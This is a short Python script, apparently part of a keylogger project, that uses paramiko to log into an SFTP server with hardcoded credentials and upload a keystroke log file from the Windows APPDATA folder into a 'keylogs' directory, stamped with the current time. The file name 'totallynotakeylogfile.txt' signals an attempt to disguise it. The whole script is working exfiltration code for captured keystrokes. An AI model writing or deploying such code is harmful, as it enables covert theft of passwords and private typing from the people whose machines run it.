import paramiko
import os
import datetime


def sftpsend():
    host = "127.0.0.1"
    port = 2200
    transport = paramiko.Transport((host, port))

    datenow = datetime.datetime.now()

    username = "sftpuser"   
    passwd = "sftp1"
    transport.connect(None, username, passwd)

    sftp = paramiko.SFTPClient.from_transport(transport)

    print("Connection Successful")

    appdata = os.getenv('APPDATA')
    source = appdata+'/totallynotakeylogfile.txt'
    destination = "/home/sftpuser/keylogs/" + str(datenow)

    sftp.put(source, destination)

    sftp.close()
    transport.close()